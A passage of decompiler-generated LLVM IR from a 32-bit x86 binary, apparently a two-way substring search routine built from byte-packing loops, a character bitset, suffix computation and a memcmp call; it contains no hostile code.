  %v0_804ea41 = phi i32 [ %v2_804ea43, %dec_label_pc_804ea38 ], [ %v2_804ea27, %dec_label_pc_804e9f2 ]
  %v12_804ea30 = icmp eq i32 %v2_804ea17, %v0_804ea41
  br i1 %v12_804ea30, label %dec_label_pc_804eae5, label %dec_label_pc_804ea38

dec_label_pc_804ea38:                             ; preds = %dec_label_pc_804ea30
  %v1_804ea38 = add i32 %v0_804eae7, 1
  store i32 %v1_804ea38, i32* %ebx.global-to-local, align 4
  %v1_804ea3b = inttoptr i32 %v1_804ea38 to i8*
  %v2_804ea3b = load i8, i8* %v1_804ea3b, align 1
  %v3_804ea3b = zext i8 %v2_804ea3b to i32
  %v2_804ea41 = or i32 %v3_804ea3b, %v0_804ea41
  %v2_804ea43 = mul i32 %v2_804ea41, 256
  store i32 %v2_804ea43, i32* @ecx, align 4
  %v4_804ea46 = icmp eq i8 %v2_804ea3b, 0
  %v1_804ea48 = icmp eq i1 %v4_804ea46, false
  %v2_804ea48 = zext i1 %v1_804ea48 to i32
  store i32 %v2_804ea48, i32* %eax.global-to-local, align 4
  br i1 %v1_804ea48, label %dec_label_pc_804ea30, label %dec_label_pc_804ea4d

dec_label_pc_804ea4d:                             ; preds = %dec_label_pc_804ea38
  br label %dec_label_pc_804e94a

dec_label_pc_804ea54:                             ; preds = %dec_label_pc_804e9e9
  %v2_804ea54 = add i32 %v3_804e97a, 3
  %v3_804ea54 = inttoptr i32 %v2_804ea54 to i8*
  %v4_804ea54 = load i8, i8* %v3_804ea54, align 1
  %v5_804ea54 = icmp eq i8 %v4_804ea54, 0
  br i1 %v5_804ea54, label %dec_label_pc_804e9dc, label %dec_label_pc_804ea5a

dec_label_pc_804ea5a:                             ; preds = %dec_label_pc_804ea54
  %v1_804ea5a = add i32 %v0_804e985, 4
  %v2_804ea5a = inttoptr i32 %v1_804ea5a to i8*
  %v3_804ea5a = load i8, i8* %v2_804ea5a, align 1
  %v4_804ea5a = icmp eq i8 %v3_804ea5a, 0
  %v1_804ea60 = icmp eq i1 %v4_804ea5a, false
  br i1 %v1_804ea60, label %dec_label_pc_804eb07, label %dec_label_pc_804ea66

dec_label_pc_804ea66:                             ; preds = %dec_label_pc_804ea5a
  %v1_804ea66 = inttoptr i32 %v0_804e985 to i8*
  %v2_804ea66 = load i8, i8* %v1_804ea66, align 1
  %v3_804ea66 = zext i8 %v2_804ea66 to i32
  store i32 %v3_804ea66, i32* %eax.global-to-local, align 4
  %v3_804ea6d = load i8, i8* %v2_804e9e9, align 1
  %v4_804ea6d = zext i8 %v3_804ea6d to i32
  store i32 %v4_804ea6d, i32* %ebx.global-to-local, align 4
  %v3_804ea71 = load i8, i8* %v3_804ea54, align 1
  %v4_804ea71 = zext i8 %v3_804ea71 to i32
  %v2_804ea75 = mul nuw i32 %v3_804ea66, 16777216
  store i32 %v2_804ea75, i32* %eax.global-to-local, align 4
  %v2_804ea78 = or i32 %v4_804ea6d, %v2_804ea75
  store i32 %v2_804ea78, i32* %ebx.global-to-local, align 4
  %v3_804ea7a = load i8, i8* %v2_804e985, align 1
  %v4_804ea7a = zext i8 %v3_804ea7a to i32
  %v2_804ea81 = mul nuw nsw i32 %v4_804ea7a, 65536
  store i32 %v2_804ea81, i32* %eax.global-to-local, align 4
  %v2_804ea84 = or i32 %v2_804ea81, %v2_804ea78
  store i32 %v2_804ea84, i32* %ebx.global-to-local, align 4
  %v3_804ea86 = load i8, i8* %v2_804e992, align 1
  %v4_804ea86 = zext i8 %v3_804ea86 to i32
  %v2_804ea8a = mul nuw nsw i32 %v4_804ea86, 256
  store i32 %v2_804ea8a, i32* %eax.global-to-local, align 4
  %v2_804ea8d = or i32 %v2_804ea8a, %v2_804ea84
  store i32 %v2_804ea8d, i32* %ebx.global-to-local, align 4
  %v1_804ea8f = inttoptr i32 %v3_804e97a to i8*
  %v2_804ea8f = load i8, i8* %v1_804ea8f, align 1
  %v3_804ea8f = zext i8 %v2_804ea8f to i32
  %v2_804ea92 = mul nuw i32 %v3_804ea8f, 16777216
  store i32 %v2_804ea92, i32* %eax.global-to-local, align 4
  %v2_804ea95 = or i32 %v2_804ea92, %v4_804ea71
  %v3_804ea97 = load i8, i8* %v3_804e98b, align 1
  %v4_804ea97 = zext i8 %v3_804ea97 to i32
  %v2_804ea9b = mul nuw nsw i32 %v4_804ea97, 65536
  store i32 %v2_804ea9b, i32* %eax.global-to-local, align 4
  %v2_804ea9e = or i32 %v2_804ea9b, %v2_804ea95
  %v3_804eaa0 = load i8, i8* %v3_804e9e3, align 1
  %v4_804eaa0 = zext i8 %v3_804eaa0 to i32
  %v2_804eaa4 = mul nuw nsw i32 %v4_804eaa0, 256
  %v2_804eaa7 = or i32 %v2_804eaa4, %v2_804ea9e
  store i32 %v2_804eaa7, i32* @ecx, align 4
  %v4_804eaa9 = icmp eq i8 %v3_804ea71, 0
  %v1_804eaab = icmp eq i1 %v4_804eaa9, false
  %v2_804eaab = zext i1 %v1_804eaab to i32
  %v5_804eaab = or i32 %v2_804eaab, %v2_804eaa4
  store i32 %v5_804eaab, i32* %eax.global-to-local, align 4
  br i1 %v4_804eaa9, label %dec_label_pc_804e9dc, label %dec_label_pc_804eab4

dec_label_pc_804eab4:                             ; preds = %dec_label_pc_804ea66, %dec_label_pc_804eab8
  %v0_804eaf7 = phi i32 [ %v1_804eab8, %dec_label_pc_804eab8 ], [ %v2_804ea54, %dec_label_pc_804ea66 ]
  %v0_804eaf5 = phi i32 [ %v2_804eac8, %dec_label_pc_804eab8 ], [ %v5_804eaab, %dec_label_pc_804ea66 ]
  %v0_804eabe = phi i32 [ %v2_804eac4, %dec_label_pc_804eab8 ], [ %v2_804eaa7, %dec_label_pc_804ea66 ]
  %v12_804eab4 = icmp eq i32 %v2_804ea8d, %v0_804eabe
  br i1 %v12_804eab4, label %dec_label_pc_804eaf5, label %dec_label_pc_804eab8

dec_label_pc_804eab8:                             ; preds = %dec_label_pc_804eab4
  %v1_804eab8 = add i32 %v0_804eaf7, 1
  %v1_804eabb = inttoptr i32 %v1_804eab8 to i8*
  %v2_804eabb = load i8, i8* %v1_804eabb, align 1
  %v3_804eabb = zext i8 %v2_804eabb to i32
  %v2_804eabe = mul i32 %v0_804eabe, 256
  %v2_804eac4 = or i32 %v3_804eabb, %v2_804eabe
  store i32 %v2_804eac4, i32* @ecx, align 4
  %v4_804eac6 = icmp eq i8 %v2_804eabb, 0
  %v1_804eac8 = icmp eq i1 %v4_804eac6, false
  %v2_804eac8 = zext i1 %v1_804eac8 to i32
  store i32 %v2_804eac8, i32* %eax.global-to-local, align 4
  br i1 %v1_804eac8, label %dec_label_pc_804eab4, label %dec_label_pc_804eacd

dec_label_pc_804eacd:                             ; preds = %dec_label_pc_804eab8
  br label %dec_label_pc_804e94a

dec_label_pc_804ead4:                             ; preds = %dec_label_pc_804e9be
  %v3_804ead4 = trunc i32 %v0_804ead4 to i8
  %v4_804ead4 = icmp eq i8 %v3_804ead4, 0
  %v1_804ead6 = add i32 %v0_804ead6, -1
  %v1_804ead9 = icmp eq i1 %v4_804ead4, false
  br i1 %v1_804ead9, label %dec_label_pc_804e94a, label %dec_label_pc_804e9dc

dec_label_pc_804eae5:                             ; preds = %dec_label_pc_804ea30
  %v3_804eae5 = trunc i32 %v0_804eae5 to i8
  %v4_804eae5 = icmp eq i8 %v3_804eae5, 0
  %v1_804eae7 = add i32 %v0_804eae7, -2
  %v1_804eaea = icmp eq i1 %v4_804eae5, false
  br i1 %v1_804eaea, label %dec_label_pc_804e94a, label %dec_label_pc_804e9dc

dec_label_pc_804eaf5:                             ; preds = %dec_label_pc_804eab4
  %v3_804eaf5 = trunc i32 %v0_804eaf5 to i8
  %v4_804eaf5 = icmp eq i8 %v3_804eaf5, 0
  %v1_804eaf7 = add i32 %v0_804eaf7, -3
  %v1_804eafa = icmp eq i1 %v4_804eaf5, false
  br i1 %v1_804eafa, label %dec_label_pc_804e94a, label %dec_label_pc_804eb00

dec_label_pc_804eb00:                             ; preds = %dec_label_pc_804eaf5
  br label %dec_label_pc_804e94a

dec_label_pc_804eb07:                             ; preds = %dec_label_pc_804ea5a
  store i1 false, i1* @df, align 1
  %tmp90 = bitcast i32* %stack_var_-48 to i8*
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804eb1a = call i8* @_memset(i8* %tmp90, i32 0, i32 8)
  %v6_804eb1a = ptrtoint i8* %v5_804eb1a to i32
  store i32 %v6_804eb1a, i32* @ecx, align 4
  %v0_804eb1c = load i32, i32* %ebp.global-to-local, align 4
  %v1_804eb1c = inttoptr i32 %v0_804eb1c to i8*
  %v2_804eb1c = load i8, i8* %v1_804eb1c, align 1
  %v3_804eb1c = zext i8 %v2_804eb1c to i32
  store i32 %v3_804eb1c, i32* %eax.global-to-local, align 4
  %v4_804eb30 = icmp eq i8 %v2_804eb1c, 0
  br i1 %v4_804eb30, label %dec_label_pc_804eb85, label %dec_label_pc_804eb34

dec_label_pc_804eb34:                             ; preds = %dec_label_pc_804eb07
  %v0_804eb34 = load i32, i32* @esi, align 4
  %v1_804eb34 = inttoptr i32 %v0_804eb34 to i8*
  %v2_804eb34 = load i8, i8* %v1_804eb34, align 1
  %v3_804eb34 = icmp eq i8 %v2_804eb34, 0
  %v1_804eb37 = icmp eq i1 %v3_804eb34, false
  br i1 %v1_804eb37, label %dec_label_pc_804eb4e, label %dec_label_pc_804e9dc

dec_label_pc_804eb40:                             ; preds = %bb91
  store i32 %v0_804eb79, i32* @ecx, align 4
  %v1_804eb44 = load i32, i32* @esi, align 4
  %v2_804eb44 = add i32 %v1_804eb44, %v0_804eb79
  %v3_804eb44 = inttoptr i32 %v2_804eb44 to i8*
  %v4_804eb44 = load i8, i8* %v3_804eb44, align 1
  %v5_804eb44 = icmp eq i8 %v4_804eb44, 0
  br i1 %v5_804eb44, label %dec_label_pc_804e9dc, label %dec_label_pc_804eb4e

dec_label_pc_804eb4e:                             ; preds = %dec_label_pc_804eb34, %dec_label_pc_804eb40
  %v0_804eb4e = phi i32 [ %v5_804eb7d, %dec_label_pc_804eb40 ], [ %v3_804eb1c, %dec_label_pc_804eb34 ]
  %stack_var_-1108.0 = phi i32 [ %v4_804eb58, %dec_label_pc_804eb40 ], [ 0, %dec_label_pc_804eb34 ]
  store i32 %v0_804eb4e, i32* %ebx.global-to-local, align 4
  %v3_804eb53 = udiv i32 %v0_804eb4e, 32
  %v4_804eb58 = add i32 %stack_var_-1108.0, 1
  %v1_804eb5d = urem i32 %v0_804eb4e, 32
  %v2_804eb5d = icmp eq i32 %v1_804eb5d, 0
  br i1 %v2_804eb5d, label %bb91, label %bb

bb:                                               ; preds = %dec_label_pc_804eb4e
  %v5_804eb68 = shl i32 1, %v1_804eb5d
  br label %bb91

bb91:                                             ; preds = %dec_label_pc_804eb4e, %bb
  %storemerge193 = phi i32 [ %v5_804eb68, %bb ], [ 1, %dec_label_pc_804eb4e ]
  %v7_804eb6a = phi i32 [ %v5_804eb68, %bb ], [ 1, %dec_label_pc_804eb4e ]
  store i32 %storemerge193, i32* %eax.global-to-local, align 4
  %v0_804eb6a = load i32, i32* @esp, align 4
  %v2_804eb6a = mul nuw nsw i32 %v3_804eb53, 4
  %v3_804eb6a = add nuw nsw i32 %v2_804eb6a, 1100
  %v4_804eb6a = add i32 %v3_804eb6a, %v0_804eb6a
  %v5_804eb6a = inttoptr i32 %v4_804eb6a to i32*
  %v6_804eb6a = load i32, i32* %v5_804eb6a, align 4
  %v8_804eb6a = or i32 %v6_804eb6a, %v7_804eb6a
  store i32 %v8_804eb6a, i32* %v5_804eb6a, align 4
  store i32 %v4_804eb58, i32* %eax.global-to-local, align 4
  %v1_804eb75 = load i32, i32* @esp, align 4
  %v2_804eb75 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804eb75 = mul i32 %v2_804eb75, 4
  %v4_804eb75 = add i32 %v1_804eb75, 76
  %v5_804eb75 = add i32 %v4_804eb75, %v3_804eb75
  %v6_804eb75 = inttoptr i32 %v5_804eb75 to i32*
  store i32 %v4_804eb58, i32* %v6_804eb75, align 4
  %v0_804eb79 = load i32, i32* %eax.global-to-local, align 4
  %v1_804eb7d = load i32, i32* %ebp.global-to-local, align 4
  %v2_804eb7d = add i32 %v1_804eb7d, %v0_804eb79
  %v3_804eb7d = inttoptr i32 %v2_804eb7d to i8*
  %v4_804eb7d = load i8, i8* %v3_804eb7d, align 1
  %v5_804eb7d = zext i8 %v4_804eb7d to i32
  store i32 %v5_804eb7d, i32* %eax.global-to-local, align 4
  %v4_804eb81 = icmp eq i8 %v4_804eb7d, 0
  %v1_804eb83 = icmp eq i1 %v4_804eb81, false
  br i1 %v1_804eb83, label %dec_label_pc_804eb40, label %dec_label_pc_804eb85

dec_label_pc_804eb85:                             ; preds = %bb91, %dec_label_pc_804eb07
  %v0_804ec91 = phi i32 [ %v0_804eb1c, %dec_label_pc_804eb07 ], [ %v1_804eb7d, %bb91 ]
  %stack_var_-1108.1 = phi i32 [ 0, %dec_label_pc_804eb07 ], [ %v4_804eb58, %bb91 ]
  %stack_var_-1100.0 = phi i32 [ 0, %dec_label_pc_804eb07 ], [ %v0_804eb79, %bb91 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v10_804eb9f120135151 = icmp ugt i32 %stack_var_-1108.1, 1
  %v1_804eba3127142158 = icmp eq i1 %v10_804eb9f120135151, false
  br i1 %v1_804eba3127142158, label %dec_label_pc_804ebf2, label %dec_label_pc_804eba5.lr.ph.lr.ph

dec_label_pc_804eba5.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804eb85, %dec_label_pc_804ebcb
  %v2_804eb9c118133161 = phi i32 [ %v2_804eb9c118133, %dec_label_pc_804ebcb ], [ 1, %dec_label_pc_804eb85 ]
  %stack_var_-1112.0.ph160 = phi i32 [ %v1_804eb9c33143, %dec_label_pc_804ebcb ], [ -1, %dec_label_pc_804eb85 ]
  %v1_804eb9c34159 = phi i32 [ %v1_804ebcb, %dec_label_pc_804ebcb ], [ 0, %dec_label_pc_804eb85 ]
  br label %dec_label_pc_804eba5.lr.ph

dec_label_pc_804eba5.lr.ph:                       ; preds = %dec_label_pc_804eba5.lr.ph.lr.ph, %dec_label_pc_804ebc2
  %v2_804eb9c118145 = phi i32 [ %v2_804eb9c118133161, %dec_label_pc_804eba5.lr.ph.lr.ph ], [ %v2_804eb9c118, %dec_label_pc_804ebc2 ]
  %stack_var_-1084.0.ph144 = phi i32 [ 1, %dec_label_pc_804eba5.lr.ph.lr.ph ], [ %stack_var_-1084.1, %dec_label_pc_804ebc2 ]
  %v1_804eb9c33143 = phi i32 [ %v1_804eb9c34159, %dec_label_pc_804eba5.lr.ph.lr.ph ], [ %v2_804eb9c129, %dec_label_pc_804ebc2 ]
  br label %dec_label_pc_804eba5

dec_label_pc_804eba5:                             ; preds = %dec_label_pc_804eba5.lr.ph, %dec_label_pc_804ebe9
  %v2_804eb9c129 = phi i32 [ %v2_804eb9c118145, %dec_label_pc_804eba5.lr.ph ], [ %v2_804eb9c, %dec_label_pc_804ebe9 ]
  %v0_804ebeb128 = phi i32 [ 1, %dec_label_pc_804eba5.lr.ph ], [ %v1_804ebeb, %dec_label_pc_804ebe9 ]
  store i32 %stack_var_-1112.0.ph160, i32* %eax.global-to-local, align 4
  %v2_804eba9 = add i32 %v0_804ebeb128, %stack_var_-1112.0.ph160
  %v2_804ebac = add i32 %v2_804eb9c129, %v0_804ec91
  %v3_804ebac = inttoptr i32 %v2_804ebac to i8*
  %v4_804ebac = load i8, i8* %v3_804ebac, align 1
  %v5_804ebac = zext i8 %v4_804ebac to i32
  store i32 %v5_804ebac, i32* %eax.global-to-local, align 4
  %v2_804ebb1 = add i32 %v2_804eba9, %v0_804ec91
  %v3_804ebb1 = inttoptr i32 %v2_804ebb1 to i8*
  %v4_804ebb1 = load i8, i8* %v3_804ebb1, align 1
  %v17_804ebb1 = icmp eq i8 %v4_804ebb1, %v4_804ebac
  br i1 %v17_804ebb1, label %dec_label_pc_804ebe3, label %dec_label_pc_804ebb6

dec_label_pc_804ebb6:                             ; preds = %dec_label_pc_804eba5
  %v12_804ebb1 = icmp ult i8 %v4_804ebb1, %v4_804ebac
  br i1 %v12_804ebb1, label %dec_label_pc_804ebcb, label %dec_label_pc_804ebb8

dec_label_pc_804ebb8:                             ; preds = %dec_label_pc_804ebb6
  %v5_804ebba = sub i32 %v2_804eb9c129, %stack_var_-1112.0.ph160
  br label %dec_label_pc_804ebc2

dec_label_pc_804ebc2:                             ; preds = %dec_label_pc_804ebe3, %dec_label_pc_804ebb8
  %stack_var_-1084.1 = phi i32 [ %v5_804ebba, %dec_label_pc_804ebb8 ], [ %stack_var_-1084.0.ph144, %dec_label_pc_804ebe3 ]
  store i32 %v2_804eb9c129, i32* %ebx.global-to-local, align 4
  %v2_804eb9c118 = add i32 %v2_804eb9c129, 1
  %v10_804eb9f120 = icmp ult i32 %v2_804eb9c118, %stack_var_-1108.1
  %v1_804eba3127 = icmp eq i1 %v10_804eb9f120, false
  br i1 %v1_804eba3127, label %dec_label_pc_804ebf2, label %dec_label_pc_804eba5.lr.ph

dec_label_pc_804ebcb:                             ; preds = %dec_label_pc_804ebb6
  %v1_804ebcb = add i32 %v1_804eb9c33143, 1
  store i32 %v1_804ebcb, i32* %ebx.global-to-local, align 4
  %v2_804eb9c118133 = add i32 %v1_804eb9c33143, 2
  %v10_804eb9f120135 = icmp ult i32 %v2_804eb9c118133, %stack_var_-1108.1
  %v1_804eba3127142 = icmp eq i1 %v10_804eb9f120135, false
  br i1 %v1_804eba3127142, label %dec_label_pc_804ebf2, label %dec_label_pc_804eba5.lr.ph.lr.ph

dec_label_pc_804ebe3:                             ; preds = %dec_label_pc_804eba5
  %v15_804ebe3 = icmp eq i32 %v0_804ebeb128, %stack_var_-1084.0.ph144
  br i1 %v15_804ebe3, label %dec_label_pc_804ebc2, label %dec_label_pc_804ebe9

dec_label_pc_804ebe9:                             ; preds = %dec_label_pc_804ebe3
  %v1_804ebeb = add i32 %v0_804ebeb128, 1
  store i32 %v1_804eb9c33143, i32* %ebx.global-to-local, align 4
  %v2_804eb9c = add i32 %v1_804ebeb, %v1_804eb9c33143
  %v10_804eb9f = icmp ult i32 %v2_804eb9c, %stack_var_-1108.1
  %v1_804eba3 = icmp eq i1 %v10_804eb9f, false
  br i1 %v1_804eba3, label %dec_label_pc_804ebf2, label %dec_label_pc_804eba5

dec_label_pc_804ebf2:                             ; preds = %dec_label_pc_804ebe9, %dec_label_pc_804ebcb, %dec_label_pc_804eb85, %dec_label_pc_804ebc2
  %stack_var_-1112.0.ph.lcssa = phi i32 [ -1, %dec_label_pc_804eb85 ], [ %v1_804eb9c33143, %dec_label_pc_804ebcb ], [ %stack_var_-1112.0.ph160, %dec_label_pc_804ebc2 ], [ %stack_var_-1112.0.ph160, %dec_label_pc_804ebe9 ]
  %stack_var_-1084.0.ph.lcssa = phi i32 [ 1, %dec_label_pc_804eb85 ], [ 1, %dec_label_pc_804ebcb ], [ %stack_var_-1084.1, %dec_label_pc_804ebc2 ], [ %stack_var_-1084.0.ph144, %dec_label_pc_804ebe9 ]
  br label %dec_label_pc_804ec09.outer

dec_label_pc_804ec09.outer:                       ; preds = %dec_label_pc_804ec38, %dec_label_pc_804ebf2
  %v1_804ec0944 = phi i32 [ %v1_804ec38, %dec_label_pc_804ec38 ], [ 0, %dec_label_pc_804ebf2 ]
  %stack_var_-1096.0.ph = phi i32 [ %v1_804ec0943, %dec_label_pc_804ec38 ], [ -1, %dec_label_pc_804ebf2 ]
  br label %dec_label_pc_804ec09.outer3

dec_label_pc_804ec09.outer3:                      ; preds = %dec_label_pc_804ec09.outer, %dec_label_pc_804ec2f
  %v1_804ec0943 = phi i32 [ %v1_804ec0944, %dec_label_pc_804ec09.outer ], [ %v2_804ec09, %dec_label_pc_804ec2f ]
  %stack_var_-1080.0.ph = phi i32 [ 1, %dec_label_pc_804ec09.outer ], [ %stack_var_-1080.1, %dec_label_pc_804ec2f ]
  br label %dec_label_pc_804ec09

dec_label_pc_804ec09:                             ; preds = %dec_label_pc_804ec09.outer3, %dec_label_pc_804ec56
  %v0_804ec58 = phi i32 [ 1, %dec_label_pc_804ec09.outer3 ], [ %v1_804ec58, %dec_label_pc_804ec56 ]
  %v2_804ec09 = add i32 %v0_804ec58, %v1_804ec0943
  %v10_804ec0c = icmp ult i32 %v2_804ec09, %stack_var_-1108.1
  %v1_804ec10 = icmp eq i1 %v10_804ec0c, false
  store i32 %stack_var_-1096.0.ph, i32* %eax.global-to-local, align 4
  br i1 %v1_804ec10, label %dec_label_pc_804ec5f, label %dec_label_pc_804ec12

dec_label_pc_804ec12:                             ; preds = %dec_label_pc_804ec09
  %v2_804ec16 = add i32 %v0_804ec58, %stack_var_-1096.0.ph
  %v2_804ec19 = add i32 %v2_804ec09, %v0_804ec91
  %v3_804ec19 = inttoptr i32 %v2_804ec19 to i8*
  %v4_804ec19 = load i8, i8* %v3_804ec19, align 1
  %v5_804ec19 = zext i8 %v4_804ec19 to i32
  store i32 %v5_804ec19, i32* %eax.global-to-local, align 4
  %v2_804ec1e = add i32 %v2_804ec16, %v0_804ec91
  %v3_804ec1e = inttoptr i32 %v2_804ec1e to i8*
  %v4_804ec1e = load i8, i8* %v3_804ec1e, align 1
  %v17_804ec1e = icmp eq i8 %v4_804ec1e, %v4_804ec19
  br i1 %v17_804ec1e, label %dec_label_pc_804ec50, label %dec_label_pc_804ec23

dec_label_pc_804ec23:                             ; preds = %dec_label_pc_804ec12
  %v12_804ec1e = icmp ult i8 %v4_804ec1e, %v4_804ec19
  %v1_804ec23 = icmp eq i1 %v12_804ec1e, false
  br i1 %v1_804ec23, label %dec_label_pc_804ec38, label %dec_label_pc_804ec25

dec_label_pc_804ec25:                             ; preds = %dec_label_pc_804ec23
  %v5_804ec27 = sub i32 %v2_804ec09, %stack_var_-1096.0.ph
  br label %dec_label_pc_804ec2f

dec_label_pc_804ec2f:                             ; preds = %dec_label_pc_804ec50, %dec_label_pc_804ec25
  %stack_var_-1080.1 = phi i32 [ %v5_804ec27, %dec_label_pc_804ec25 ], [ %stack_var_-1080.0.ph, %dec_label_pc_804ec50 ]
  br label %dec_label_pc_804ec09.outer3

dec_label_pc_804ec38:                             ; preds = %dec_label_pc_804ec23
  %v1_804ec38 = add i32 %v1_804ec0943, 1
  br label %dec_label_pc_804ec09.outer

dec_label_pc_804ec50:                             ; preds = %dec_label_pc_804ec12
  %v15_804ec50 = icmp eq i32 %v0_804ec58, %stack_var_-1080.0.ph
  br i1 %v15_804ec50, label %dec_label_pc_804ec2f, label %dec_label_pc_804ec56

dec_label_pc_804ec56:                             ; preds = %dec_label_pc_804ec50
  %v1_804ec58 = add i32 %v0_804ec58, 1
  br label %dec_label_pc_804ec09

dec_label_pc_804ec5f:                             ; preds = %dec_label_pc_804ec09
  %v1_804ec67 = add i32 %stack_var_-1096.0.ph, 1
  store i32 %v1_804ec67, i32* %eax.global-to-local, align 4
  %v1_804ec6a = add i32 %stack_var_-1112.0.ph.lcssa, 1
  %tmp = icmp ugt i32 %v1_804ec67, %v1_804ec6a
  br i1 %tmp, label %dec_label_pc_804ec75, label %dec_label_pc_804ec89

dec_label_pc_804ec75:                             ; preds = %dec_label_pc_804ec5f
  br label %dec_label_pc_804ec89

dec_label_pc_804ec89:                             ; preds = %dec_label_pc_804ec5f, %dec_label_pc_804ec75
  %v3_804edc3 = phi i32 [ %v1_804ec6a, %dec_label_pc_804ec5f ], [ %v1_804ec67, %dec_label_pc_804ec75 ]
  %stack_var_-1112.1 = phi i32 [ %stack_var_-1112.0.ph.lcssa, %dec_label_pc_804ec5f ], [ %stack_var_-1096.0.ph, %dec_label_pc_804ec75 ]
  %stack_var_-1084.2 = phi i32 [ %stack_var_-1084.0.ph.lcssa, %dec_label_pc_804ec5f ], [ %stack_var_-1080.0.ph, %dec_label_pc_804ec75 ]
  %v2_804ec98 = add i32 %stack_var_-1084.2, %v0_804ec91
  store i32 %v2_804ec98, i32* %eax.global-to-local, align 4
  %v3_804eca0 = inttoptr i32 %v2_804ec98 to i8*
  %v4_804eca0 = call i32 @memcmp(i8* %v3_804eca0, i32 %v3_804edc3, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804eca0, i32* %eax.global-to-local, align 4
  %v1_804eca5 = icmp eq i32 %v4_804eca0, 0
  br i1 %v1_804eca5, label %dec_label_pc_804ee38, label %dec_label_pc_804ecad

dec_label_pc_804ecad:                             ; preds = %dec_label_pc_804ec89
  %v5_804ecb1 = sub i32 %stack_var_-1108.1, %stack_var_-1112.1
  %v1_804ecb5 = add i32 %v5_804ecb1, -1
  %v10_804ecb8 = icmp ult i32 %v1_804ecb5, %stack_var_-1112.1
  %v1_804ecbc = icmp eq i1 %v10_804ecb8, false
  br i1 %v1_804ecbc, label %dec_label_pc_804ecc2, label %dec_label_pc_804ecbe

dec_label_pc_804ecbe:                             ; preds = %dec_label_pc_804ecad
  br label %dec_label_pc_804ecc2

dec_label_pc_804ecc2:                             ; preds = %dec_label_pc_804ecad, %dec_label_pc_804ecbe
  %v0_804ecc2 = phi i32 [ %stack_var_-1112.1, %dec_label_pc_804ecbe ], [ %v1_804ecb5, %dec_label_pc_804ecad ]
  %v1_804ecc2 = add i32 %v0_804ecc2, 1
  store i32 %v1_804ecc2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ecd1

dec_label_pc_804ecd1:                             ; preds = %dec_label_pc_804ee38, %dec_label_pc_804ecc2
  %stack_var_-1084.3 = phi i32 [ %stack_var_-1084.2, %dec_label_pc_804ee38 ], [ %v1_804ecc2, %dec_label_pc_804ecc2 ]
  %storemerge = phi i32 [ %v5_804ee3c, %dec_label_pc_804ee38 ], [ 0, %dec_label_pc_804ecc2 ]
  %v0_804ecd1 = load i32, i32* @esi, align 4
  store i32 %v0_804ecd1, i32* @ebx, align 4
  %v5_804ecdb = sub i32 %stack_var_-1108.1, %stack_var_-1084.3
  store i32 %v5_804ecdb, i32* %eax.global-to-local, align 4
  %v1_804ece7 = or i32 %stack_var_-1108.1, 63
  %v1_804ed3e = icmp eq i32 %storemerge, 0
  %v2_804edbe = add i32 %v3_804edc3, -1
  br label %dec_label_pc_804ecf2

dec_label_pc_804ecf2:                             ; preds = %dec_label_pc_804ee69, %dec_label_pc_804ee56, %dec_label_pc_804edf0, %dec_label_pc_804ed54, %dec_label_pc_804ecd1
  %v1_804ecf6 = phi i32 [ %v0_804ecd1, %dec_label_pc_804ecd1 ], [ %v5_804edf0, %dec_label_pc_804edf0 ], [ %v5_804ee6d, %dec_label_pc_804ee69 ], [ %v2_804ee62, %dec_label_pc_804ee56 ], [ %v2_804ed54, %dec_label_pc_804ed54 ]
  %stack_var_-1076.0 = phi i32 [ %v3_804e97a, %dec_label_pc_804ecd1 ], [ %stack_var_-1076.1, %dec_label_pc_804edf0 ], [ %stack_var_-1076.1, %dec_label_pc_804ee69 ], [ %stack_var_-1076.1, %dec_label_pc_804ee56 ], [ %stack_var_-1076.1, %dec_label_pc_804ed54 ]
  %stack_var_-1116.0 = phi i32 [ 0, %dec_label_pc_804ecd1 ], [ 0, %dec_label_pc_804edf0 ], [ %storemerge, %dec_label_pc_804ee69 ], [ 0, %dec_label_pc_804ee56 ], [ 0, %dec_label_pc_804ed54 ]
  %v2_804ecf6 = sub i32 %stack_var_-1076.0, %v1_804ecf6
  store i32 %v2_804ecf6, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %stack_var_-1108.1, %v2_804ecf6
  br i1 %tmp196, label %dec_label_pc_804ee01, label %dec_label_pc_804ed02

dec_label_pc_804ed02:                             ; preds = %dec_label_pc_804ee21, %dec_label_pc_804ecf2, %dec_label_pc_804ee49
  %v0_804edf0 = phi i32 [ %v1_804ecf6, %dec_label_pc_804ecf2 ], [ %v0_804ed06.pre, %dec_label_pc_804ee49 ], [ %v1_804ee25, %dec_label_pc_804ee21 ]
  %stack_var_-1076.1 = phi i32 [ %stack_var_-1076.0, %dec_label_pc_804ecf2 ], [ %v5_804ee4d, %dec_label_pc_804ee49 ], [ %v4_804ee18, %dec_label_pc_804ee21 ]
  %v1_804ed06 = add i32 %v0_804edf0, -1
  store i32 %v1_804ed06, i32* %eax.global-to-local, align 4
  %v2_804ed0d = add i32 %v1_804ed06, %stack_var_-1100.0
  %v3_804ed0d = inttoptr i32 %v2_804ed0d to i8*
  %v4_804ed0d = load i8, i8* %v3_804ed0d, align 1
  %v5_804ed0d = zext i8 %v4_804ed0d to i32
  %v3_804ed14 = udiv i8 %v4_804ed0d, 32
  %v8_804ed14 = zext i8 %v3_804ed14 to i32
  store i32 %v8_804ed14, i32* %eax.global-to-local, align 4
  %tmp197 = urem i8 %v4_804ed0d, 32
  %v1_804ed1c = zext i8 %tmp197 to i32
  %v2_804ed1c = icmp eq i8 %tmp197, 0
  store i32 %v1_804ed1c, i32* @ecx, align 4
  %v0_804ed1f = load i32, i32* @esp, align 4
  %v2_804ed1f = mul nuw nsw i32 %v8_804ed14, 4
  %v3_804ed1f = add nuw nsw i32 %v2_804ed1f, 1100
  %v4_804ed1f = add i32 %v3_804ed1f, %v0_804ed1f
  %v5_804ed1f = inttoptr i32 %v4_804ed1f to i32*
  %v6_804ed1f = load i32, i32* %v5_804ed1f, align 4
  br i1 %v2_804ed1c, label %bb93, label %bb92

bb92:                                             ; preds = %dec_label_pc_804ed02
  %v5_804ed26 = lshr i32 %v6_804ed1f, %v1_804ed1c
  br label %bb93

bb93:                                             ; preds = %dec_label_pc_804ed02, %bb92
  %storemerge195 = phi i32 [ %v5_804ed26, %bb92 ], [ %v6_804ed1f, %dec_label_pc_804ed02 ]
